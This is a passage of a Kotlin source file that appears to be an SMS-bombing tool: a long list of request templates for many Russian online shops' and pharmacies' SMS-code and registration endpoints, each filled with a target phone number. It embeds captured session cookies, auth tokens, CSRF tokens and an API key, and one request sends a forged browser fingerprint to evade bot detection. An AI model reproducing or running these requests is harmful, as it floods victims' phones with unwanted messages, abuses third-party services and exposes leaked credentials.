directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; tmr_detect=0%7C1689626350301; _gali=ga-login_code_get' \
                          -H 'origin: https://imkosmetik.com' \
                          -H 'referer: https://imkosmetik.com/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw '{"phone":"+{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://knopkadengi.ru/api/registration/send/code?mobilePhone={phone}' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: clientaction_etag=undefined; clientaction_cache=undefined; _ym_uid=16612477371039330916; _ym_d=1689626470; _ym_isad=2; _ym_visorc=w; JSESSIONID=FCCAA5A5700C3A5742589C6FEE3B1E2D' \
                          -H 'Origin: https://knopkadengi.ru' \
                          -H 'Referer: https://knopkadengi.ru/registration/step1' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://ifzshop.ru/signup/' \
                          -H 'authority: ifzshop.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: landing=%2Fsignup%2F; PHPSESSID=615srr5n1ei5gh4kr3fu4fos2p; __utma=137035368.190930219.1689626552.1689626552.1689626552.1; __utmc=137035368; __utmz=137035368.1689626552.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); __utmt=1; __utmb=137035368.1.10.1689626552; _ym_uid=1689626552157866640; _ym_d=1689626552; _ym_isad=2; pricetype_manual=0; pricetype=1; pricetype_set=1689626551; cityselect__country=rus; cityselect__show_notifier=1689626552; cityselect__city=%D0%98%D0%B6%D0%B5%D0%B2%D1%81%D0%BA; cityselect__region=18; cityselect__zip=426000' \
                          -H 'origin: https://ifzshop.ru' \
                          -H 'referer: https://ifzshop.ru/signup/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'data%5Bfirstname%5D=ewfefwef&data%5Bphone%5D=%2B{full_phone}&data%5Bbirthday%5D%5Bday%5D=&data%5Bbirthday%5D%5Bmonth%5D=4&data%5Bbirthday%5D%5Byear%5D=2001&wa_json_mode=1&need_redirects=1&contact_type=person' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://www.agatol.ru/sms/?action=sms_phone_sms_activation_get_cod&type_form=ajax&sms_type=registration&phone=%2B7+{phone:(***)+***-**-**}' \
                          -H 'Accept: text/plain, */*; q=0.01' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Cookie: CGISESSID=a248beb8ff393b3a411309b961af7ecf; tovar_recent_hash=d1fd85108cb14891abc823365ca6fccb; _ym_uid=1689626672374651798; _ym_d=1689626672; _ym_isad=2; _ym_visorc=w' \
                          -H 'Referer: https://www.agatol.ru/users_registration/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'X-Requested-With: XMLHttpRequest' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://kva-kva.ru/local/components/strangebrain/registration/ajax/ajax-code.php/?action=send_code&codeType=sms&phone=%2B7{phone:(***)***-**-**}&mail=dmitrijkotov634%40gmail.com' \
                          -H 'authority: kva-kva.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'cookie: PHPSESSID=VNSNu43qj6topf1IV37guajfY5B9MrDF; BITRIX_SM_SALE_UID=8671801; _gcl_au=1.1.905765990.1689626990; tmr_lvid=7939875507baf81e4e9959b8d7b54876; tmr_lvidTS=1689626990374; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A1%2C%22EXPIRE%22%3A1689627540%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; _gid=GA1.2.1704374175.1689626990; _gat_UA-146965423-1=1; _gat_gtag_UA_172622838_1=1; _ga_DEEHZW2Z9R=GS1.1.1689626990.1.0.1689626990.0.0.0; _ga=GA1.1.882603929.1689626990; _ym_uid=1689626990958593996; _ym_d=1689626990; _ym_isad=2; _ym_visorc=w; tmr_detect=0%7C1689626992818' \
                          -H 'referer: https://kva-kva.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          --compressed
                          """.trimIndent(), 7
    ),

    service(7) {
        method = RequestBuilder.POST

        url = "https://api.brandshop.ru/xhr/login/activationcode/"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded")
            add("authority", "api.brandshop.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "multipart/form-data; boundary=----WebKitFormBoundaryvszeEojId45BlEup")
            add(
                "cookie",
                "__ddg1_=il9AB6oL2oAwWrMntXQc; _gcl_au=1.1.530823477.1692622231; advcake_track_id=908609a5-c2c9-61bb-dbbc-2353d9134d23; advcake_session_id=401beb17-a30e-34b5-fa9d-008fb3971835; currency=RUB; rrpvid=775873912632397; tmr_lvid=1e26ecdd7577666edb6223534e7ce9c7; tmr_lvidTS=1692622231963; _ym_uid=1692622232181014725; _ym_d=1692622232; rcuid=64bff15d833c6767f1bdb21e; gdeslon.ru.__arc_domain=gdeslon.ru; gdeslon.ru.user_id=69a3d474-8b1e-42ac-97ef-4f5337e6ed1b; clv_UserID_118573=9919bce8-9a48-66cd-e517-1763cb3ca3e1.118573; analytic_id=1692622240569184; PHPSESSID=b6a907210d5e4f68c23b69d66a31266a; _ga_XC9DJE7QFL=GS1.1.1692723465.3.0.1692723465.60.0.0; _ga=GA1.2.537661873.1692622231; _gid=GA1.2.51516922.1692723466; _dc_gtm_UA-15866208-1=1; _ym_isad=2; _ym_visorc=b"
            )
            add("origin", "https://brandshop.ru")
            add("referer", "https://brandshop.ru/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-site")
            add("x-ua-protec", "c")

        }

        multipart("----WebKitFormBoundaryvszeEojId45BlEup") {
            addFormDataPart("phone", phone.format("+7(***)***-**-**"))
            addFormDataPart(
                "yaZasnyal",
                "{\"process\":{\"state\":-1,\"error\":\"BotdError: window.process is undefined\"},\"userAgent\":{\"value\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203\",\"state\":0},\"appVersion\":{\"value\":\"5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.203\",\"state\":0},\"rtt\":{\"value\":50,\"state\":0},\"windowSize\":{\"value\":{\"outerWidth\":1536,\"outerHeight\":816,\"innerWidth\":707,\"innerHeight\":746},\"state\":0},\"pluginsLength\":{\"value\":5,\"state\":0},\"pluginsArray\":{\"value\":true,\"state\":0},\"productSub\":{\"value\":\"20030107\",\"state\":0},\"mimeTypesConsistent\":{\"value\":true,\"state\":0},\"evalLength\":{\"value\":33,\"state\":0},\"webGL\":{\"value\":{\"vendor\":\"WebKit\",\"renderer\":\"WebKit WebGL\"},\"state\":0},\"webDriver\":{\"value\":false,\"state\":0},\"languages\":{\"value\":[[\"ru\"]],\"state\":0},\"documentElementKeys\":{\"value\":[\"lang\",\"data-n-head\",\"class\",\"style\"],\"state\":0},\"distinctiveProps\":{\"value\":{\"awesomium\":false,\"cef\":false,\"cefsharp\":false,\"coachjs\":false,\"fminer\":false,\"geb\":false,\"nightmarejs\":false,\"phantomas\":false,\"phantomjs\":false,\"rhino\":false,\"selenium\":false,\"webdriverio\":false,\"webdriver\":false,\"headless_chrome\":false},\"state\":0},\"notificationPermissions\":{\"value\":false,\"state\":0}}"
            )
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://stockmann.ru/auth-api/register-or-login/method/phone/send-code"

        headers {
            add("Content-Type", "application/json")
            add("authority", "stockmann.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "spid=1692723951066_f271691b17d138eec530336d2b211de1_jdeidthods8as6qu; anonymous_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjY0ZTRlYWVmNjBiYTVhYzE4MDBiYTEwYyIsInR5cGUiOiJBQ0NFU1M6QU5PTllNT1VTIiwiaWF0IjoxNjkyNzIzOTUxfQ.rLLtUz9XBcqya7l3NJ30J7NSm5TjKBnwtBAszRv9RJKOLieVAgsLk1eKI3HOqWLq-sPVj2Qi4K8H1M8U4YX5RNb7NvExXFA3jARd8PbPnAngq1-SGUTRVFs6VSPlo6I8T0FnGslv4r_jNFyE85B16mW_dmgABXedj0y8hQhKEd_wxlsR8yysPCbMf74tpUEuTfokFebHEfANXFlf8jYXiCCfXzrDgTRldLPp5lyO-BCrGG9AzXc8v3Hi8WBO0_puxRqOXH8q8usT8KcILEz20aJqkABZtxojCM7t1IXh3nrcHrIlreLqMPgRqOV65P9MqB-ll30Jq90D4LoeEBgMiWnbj41HAMyF7wG89-CMKdOCDWQsjTNNHkcFsWzVXmr9mea1BkD1ZDSC5nUC2D8LVVuhS3ImxcoE8-x49zYxJSD7JbOFhMOiYJeuI5bl_Xfvr-FI1gnj8WnTRqHvoHTK-9ayMKs2fcO04Lf4pzkwZPP-3nSC3LwHksM1HgLmtGx0ztKVedzeEtFAAT51BawMumtIp1Ez_DLewa4GFVV7JPJ0fKvgZof1YlcgTLOg32GtTNLdUR1Ly_NQlNkSYc_LW0-RWViCFd2HYXyHePx0bSI_w36rh2ufT6pIBrXYbNAeckodIchaQxP4osdTqAiYArBfBQwcY6f54zzX_091tQI; BITRIX_SM_CITY_NAME=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; BITRIX_SM_CITY_SALE_LOCATION_ID=129; BITRIX_SM_LOCATION_GUID=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; BITRIX_SM_DOMAIN_ID=1; tmr_lvid=1ecf2d436fb50d8d2f29cee5a086a395; tmr_lvidTS=1692723951077; _ym_uid=1692723951368952435; _ym_d=1692723951; rrpvid=441835674520971; _gcl_au=1.1.1361859674.1692723951; _ym_isad=2; _ym_visorc=b; rcuid=64bff15d833c6767f1bdb21e; iap.uid=d0844f0f9e1248728848c5db00986a31; flocktory-uuid=e60c012d-ac73-4f0d-94a3-0559c65f1dd9-2; _ga=GA1.2.2033612888.1692723951; _gid=GA1.2.774304042.1692723952; _gat_UA-75724517-1=1; adrdel=1; adrcid=A6Qt-_LL3yIzVKA5oT74thg; tmr_detect=0%7C1692723953617; _ga_51M9YTC352=GS1.1.1692723951.1.0.1692723954.57.0.0"
            )
            add("origin", "https://stockmann.ru")
            add("referer", "https://stockmann.ru/personal/login/?backUrl=/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add(
                "x-auth-token",
                "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ2YWx1ZSI6IjY0ZTRlYWVmNjBiYTVhYzE4MDBiYTEwYyIsInR5cGUiOiJBQ0NFU1M6QU5PTllNT1VTIiwiaWF0IjoxNjkyNzIzOTUxfQ.rLLtUz9XBcqya7l3NJ30J7NSm5TjKBnwtBAszRv9RJKOLieVAgsLk1eKI3HOqWLq-sPVj2Qi4K8H1M8U4YX5RNb7NvExXFA3jARd8PbPnAngq1-SGUTRVFs6VSPlo6I8T0FnGslv4r_jNFyE85B16mW_dmgABXedj0y8hQhKEd_wxlsR8yysPCbMf74tpUEuTfokFebHEfANXFlf8jYXiCCfXzrDgTRldLPp5lyO-BCrGG9AzXc8v3Hi8WBO0_puxRqOXH8q8usT8KcILEz20aJqkABZtxojCM7t1IXh3nrcHrIlreLqMPgRqOV65P9MqB-ll30Jq90D4LoeEBgMiWnbj41HAMyF7wG89-CMKdOCDWQsjTNNHkcFsWzVXmr9mea1BkD1ZDSC5nUC2D8LVVuhS3ImxcoE8-x49zYxJSD7JbOFhMOiYJeuI5bl_Xfvr-FI1gnj8WnTRqHvoHTK-9ayMKs2fcO04Lf4pzkwZPP-3nSC3LwHksM1HgLmtGx0ztKVedzeEtFAAT51BawMumtIp1Ez_DLewa4GFVV7JPJ0fKvgZof1YlcgTLOg32GtTNLdUR1Ly_NQlNkSYc_LW0-RWViCFd2HYXyHePx0bSI_w36rh2ufT6pIBrXYbNAeckodIchaQxP4osdTqAiYArBfBQwcY6f54zzX_091tQI"
            )
        }

        json("{\"phone\":$phone}")
    },

    service(7) {
        method = RequestBuilder.POST

        url("https://fundayshop.com/web-api/v1/auth/code/") {
            addQueryParameter("layout", "adaptive")
            addQueryParameter("locale", "ru-RU")
        }

        headers {
            add("authority", "fundayshop.com")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("authorization", "Bearer INc5HooBRYdITbI_S8TI")
            add(
                "baggage",
                "sentry-public_key=533a621a29ab430690ef78db89c12799,sentry-trace_id=39d08dd28ef84c5999622a50cd728323,sentry-sample_rate=1"
            )
            add("content-type", "application/json")
            add(
                "cookie",
                "qrator_jsr=1692724185.505.n2n6BRGW4hBfJm9U-46ubj3esavd5dubv6sgmqmi3smm0g4jb-00; qrator_jsid=1692724185.505.n2n6BRGW4hBfJm9U-qdnt1bft9d9lvcmqrucc6do7j2p9h8sv; STATIC_URL=https%3A%2F%2Fcdn.fundayshop.com%2Fupload%2Fcontent%2Fapplication%2Fru_funday%2Fprod%2Fstatic%2F; qrator_ssid=1692724185.907.PtF25u58crn1WNYG-b40asdk3k3nhg0miiudichl8sll3d768; UDID=4f7a6d42-2a39-4322-8e46-e9e869ea6be7; RlVOSURG=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJyZWZyZXNoIiwiaXNzIjoiRnVuZGF5IiwiaWF0IjoxNjkyNzI0MTg2MDY1LCJleHAiOjE3NTU4NjE0MjAwMjAsIm9zVCI6IklOYzVIb29CUllkSVRiSV9TOFRJIiwidWdUIjoiOGU0OWIzNTUtNDBhNC00NzkxLTk5NTYtZWEyMDQwY2M2MDMxIiwiYW5QIjoiNmZmYzI1M2ItNGJmYS00NjkxLWEwYjAtZTRhYjUwOGZmMmQ4IiwiYXVQIjpudWxsfQ.ymL8Ju2o-07t1ugoZO2V_AgtNvmDyyQ5bOJTPjZIVDE; tmr_lvid=1a0f5e73a764531acbd29d809bc4b009; tmr_lvidTS=1692724187530; _ga_G9X48ED99L=GS1.1.1692724187.1.0.1692724187.60.0.0; _ga=GA1.2.309468332.1692724188; _gid=GA1.2.1624225844.1692724188; _gat_UA-48483102-1=1; _dc_gtm_UA-48483102-1=1; _ym_uid=1692724188741516017; _ym_d=1692724188; CITY_ID=30210299; mindboxDeviceUUID=b5025119-1451-4b77-bc8a-7b0986de9ce7; directCrm-session=%7B%22deviceGuid%22%3A%22b5025119-1451-4b77-bc8a-7b0986de9ce7%22%7D; _ym_isad=2; _gpVisits={\"isFirstVisitDomain\":true,\"idContainer\":\"1000243A\"}; _ym_visorc=w; _gp1000243A={\"hits\":1,\"vc\":1}; supportOnlineTalkID=lzzJRyrWHifT1fgIw0lCn7H1XnqqTGHy; tmr_detect=0%7C1692724190175; isCookieUsageAgreed=1"
            )

            add("origin", "https://fundayshop.com")
            add("referer", "https://fundayshop.com/")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("sentry-trace", "39d08dd28ef84c5999622a50cd728323-bb81147418ef170e-1")
            add("x-request-id", "e9a2fd57-38c4-48b7-a40e-bcfb895c413d")
        }

        json("{\"token\":\"$phone\",\"channel\":\"sms\",\"recaptcha\":\"requestCodeToken\"}")
    },

    service(7) {
        method = RequestBuilder.POST

        url = "https://ilovesakura.ru/phone/val1date"

        headers {
            add("Content-Type", "application/json")
            add("authority", "ilovesakura.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json")
            add(
                "cookie",
                "connect.sid=s%3AVATRne1z7yZQqhi-xg-PXi5tZ-lZ5djw.rmezGcrb49GWaonK2XJBj6hKdZUzwsR2bE%2B9EXQlcXA; _ym_uid=169272445468541432; _ym_d=1692724454; tmr_lvid=fb2cf90b2863421f85f4e8702e7e25e8; tmr_lvidTS=1692724454038; _ga_CVVNN51M1S=GS1.1.1692724454.1.0.1692724454.0.0.0; _ym_isad=2; _ym_visorc=w; _ga=GA1.2.543636834.1692724454; _gid=GA1.2.2077433907.1692724454; _gat_UA-84039601-1=1; _ga_TDHT0401J4=GS1.2.1692724454.1.0.1692724454.60.0.0; tmr_detect=0%7C1692724456360; CSRF-TOKEN=Q61Ce0T3-DwlG1jZAVhYnv2p_ztMT1H1l0OI"
            )
            add("csrf-token", "Q61Ce0T3-DwlG1jZAVhYnv2p_ztMT1H1l0OI")
            add("origin", "https://ilovesakura.ru")
            add("referer", "https://ilovesakura.ru/spb")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("sec-fetch-dest", "empty")
            add("sec-fetch-mode", "cors")
            add("sec-fetch-site", "same-origin")
            add("x-requested-with", "XMLHttpRequest")
        }

        json("{\"phone\":\"${phone.format("+7 (***) ***-**-** ")}\"}")
    },

    service(7) {
        method = RequestBuilder.POST

        url = "https://api.eapteka.ru/api/v3/user"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Origin", "https://www.eapteka.ru")
            add("Referer", "https://www.eapteka.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("api-key", "K<8RNCa^ft86LnNa")
            add("platform", "frontend")
            add("region-id", "185")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
        }

        json("{\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"force_sms\":true}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://api.apteka.ru/Auth/Auth_Code"

        headers {
            add("Content-Type", "application/json")
            add("Accept", "application/json, text/plain, */*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add("Origin", "https://apteka.ru")
            add("Referer", "https://apteka.ru/")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-site")
            add("device-id", "1692791670581_638c0f55f17ee")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("user-session-id", "1692791669660_XFJ4SHF1XMDGO")
            add("x-active-exp", "64bfa9319f2f0aeea7bd2d17:1")
            add("x-session-id", "60fa2520-7fed-6314-247c-d4821f909069")
        }

        json("{\"phone\":\"${phone.format("+7 (***) ***-**-**")}\",\"u\":\"U\"}")
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://chel.zhivika.ru/auth/sms"

        headers {
            add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
            add("Accept", "*/*")
            add("Accept-Language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("Connection", "keep-alive")
            add(
                "Cookie",
                "qrator_jsr=1692792557.813.oERDg5UqHDiHxtYW-ekr24ikbenrht4onb3eifdeuvdnh47sk-00; qrator_ssid=1692792558.352.v3whhVvqFQ4fp8yd-nob10nuacbjv36ltj238lo5cbnv7650r; qrator_jsid=1692792557.813.oERDg5UqHDiHxtYW-6l989fe3h2qpgn1rki4pshqmsjqom8u9; _ym_uid=1692792560873152957; _ym_d=1692792560; _ga_YEDTZMW12Q=GS1.1.1692792560.1.0.1692792560.60.0.0; _ga=GA1.2.4326569.1692792561; _gid=GA1.2.851444955.1692792561; _gat_gtag_UA_6341946_1=1; _ym_visorc=w; _ym_isad=2; XSRF-TOKEN=eyJpdiI6IlhQZnUzdk51d2tqNjJPTzloVldNZkE9PSIsInZhbHVlIjoiV0FsR2ZmRjFhQ0dyWTFQNjdHQkxRTk8wVHBBMXBHcFpDbnhGYkVSQUJWTVBZVXB6MVc1XC84SGFmOTdxZnFhYVMiLCJtYWMiOiI3MmU4MDYxMjk1ZTUwMWY0Y2ZiYTcwNDBjZGIyMGRkYTRmZjNhM2M4MmJkNTIzYzY5Y2RiZmIxNDdlNDFhZDUyIn0%3D; laravel_session=eyJpdiI6Ikc4VkpFZCs0a0J2TUhJNThOaGNrUUE9PSIsInZhbHVlIjoiWklibzUyNTJXQkorMHNQSDhXaHUwUlczTnhaZWo4RDM5SEtveEY3TEZuTEJKU0VPOUdUaWJcL1wvVEtlNXAwMVRTIiwibWFjIjoiYzNhMzgzNjQ1NDJiYzE4ZTQxZmNlY2RmZTA5NDQwZWExMjEzZDZlMDk4ZDRlNDEyYWQzYjE5NzcyYzIyOTVkYSJ9; session_id=eyJpdiI6ImdYc3dDem1UN25KMGcxRUtCcnZzVWc9PSIsInZhbHVlIjoidkxGTTh0VlRmMzRQSkdndU9LWlhLMEhtNFJFNFwvZEFlNjlJbkFtWThCUXN6aTRvbnB0QnpjQnNBdFFGYUdaYXVqeUhsMHhLS3lEQjAyS0g0UCs0aHpRPT0iLCJtYWMiOiI2ODgwOTY1YzMwZWI2NWQyM2VmNTU3MjcxMmU0MGM0MWJiMzQ1NmVlNTczZGI1NDc0NmQzNGQxYjI3NGI4MjhiIn0%3D; plqyHpTKs3gN4eeGQJmTZvaSy6Q0T94bkDca12Qv=eyJpdiI6InhrMTBSeGNuNXVldjZNaWh5c1NHZ1E9PSIsInZhbHVlIjoiQkZzZGJ6UFp4MVYxN3JyMHdTZU45a3hDenZtQU5oZnNtNXg2YTJabU1nUlRuMlo1enBcL1VzVUw0Sk5HQlo2NTUzMjhwK1FiV0k1U1hqTzdTNGJnTWI3OFhJQUdLN0QrNFZQXC9Ha3FYNVpmTXh4TlJNcXVLYVwvV2QxdkZFSlEwZ2VaektueGNJWlI3UE5aZWJtUHdFK0JlMUNIV0wxcWZXd3RwN1RHUmRDRnpcLzRHYkhUQ2crYmhweE1XQnlrekRTeDJRbFBnN3pSRXhscksxMmpWRjNzSHA3RW0raXF5Y0ViSUkyam9Ta1ZqVVRJaVFkVUFpMjR4bkNibGZTKzBXYk5pdjRcLzFXXC9zQTlnXC82NXZQNlc2VSt0bUNBQlkrbnN3Zk9sSEVqcTQ2eG94S0dPczhlRXpcLzFlTzl5dUpCdTZzT1J4VVg0NkRmRWowRjVFanVyWndPZTNMR1wvMzFjbTdJWXZMaHFhZGRhdk1KdHcwWTVqVTV3OCtIM3ptTjhxQWFRSW5lSEdUZjdicGZGbGxOVXRaaGd4NVZNbDRMMGZPZDhIZVpaemFmWWM2enBROFBzekdmR0JkNnNjbVU4eVlZYzhITVJlYkV0XC9WM1B4RlhDQ1ZvaUNoWXc5cnN4XC9qTHlkR0lPSHBVQUNGU2FEWWZLMjZKNzA5OWcxSlJpWjZYcTZwb2VFNUUrZXRkQjBoSlR0XC9hRkZwN0tyXC9ZMVBTd2g5bDRoSFN3SFhJWT0iLCJtYWMiOiJmZjE3NDFmNmVjYTNhZTM1ZDY3ZjQ0NWUzMzE0ZmNkYWI5MmMwOTg5MmZhNjQxNzlhMDFmNWRjMzI3N2U1NjI1In0%3D"
            )
            add("Origin", "https://chel.zhivika.ru")
            add("Referer", "https://chel.zhivika.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F")
            add("Sec-Fetch-Dest", "empty")
            add("Sec-Fetch-Mode", "cors")
            add("Sec-Fetch-Site", "same-origin")
            add("X-Requested-With", "XMLHttpRequest")
            add("sec-ch-ua", "\"Not/A)Brand\";v=\"99\", \"Microsoft Edge\";v=\"115\", \"Chromium\";v=\"115\"")
            add("sec-ch-ua-mobile", "?0")
            add("sec-ch-ua-platform", "\"Windows\"")
            add("x-csrf-token", "gwB3rrPsIgSDU10oF5iFN3K58U31uLsRI0x4Gxjo")
        }

        formBody {
            add("phone", phone.format("+7 (***) ***-**-**"))
        }
    },

    service(7) {
        method = RequestBuilder.POST
        url = "https://farmakopeika.ru/auth/check-account"

        headers {
            add("Content-Type", "application/json")
            add("authority", "farmakopeika.ru")
            add("accept", "application/json, text/plain, */*")
            add("accept-language", "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7")
            add("content-type", "application/json;charset=UTF-8")
            add(
                "cookie",
                "XSRF-TOKEN=eyJpdiI6Ik94ditKT25oMm55QkRTTlRvUWkvWFE9PSIsInZhbHVlIjoiN1hhMkRwaHlOY2F2cGh3blJaQi90SlowZWxxTEs0U0lFYWZiT2lreVNpTkc2N3FJajlhdWdaNitsbTlBVmpMQUIzODlTOUNJZUVxMVVJMGN1V1RvejVIamZmUjdWdkxKZFNLeC9teE5pS2dJUkN0ZVN1RU5XK3laUGZPbDU2NlMiLCJtYWMiOiI2NDBiMzJiMDgwYWQzYWNjNTM2ZGE5NWY3Y2VkYzYxN2Q5NTYyNTE5ZTYyNzhiZjUyYTlhMjY3Yjk4M2IxOTI5IiwidGFnIjoiIn0%3D; farmakopeika_session=eyJpdiI6IlBMM0xxaGxLc3ovK1pJc08yQ2RuRUE9PSIsInZhbHVlIjoidGJ6Q25mbEc5UVU2ZjdPdy9MZUEvTzNDeUo2VkYycFk4VHY4b0kvQlltaFI0UTRPeE1odFN5U2JiM1pqT2Qyb0lQalV2bGxMNGxhcEhXbkNiZWlaSGQwZnp4ZWlFQUM5QWUydWZvcllOMlRacEIzdXc1NXZYdFU3ZjVEWDQxU08iLCJtYWMiOiI4YTRiYjk5ZDE5MzNiYTgwNWJmMDI0ZWYyM2UwMGUyYTZmYTExY2ZjZDExNGYxZjdmODEyOWZjZmI2YjU3Y2VlIiwidGFnIjoiIn0%3D; 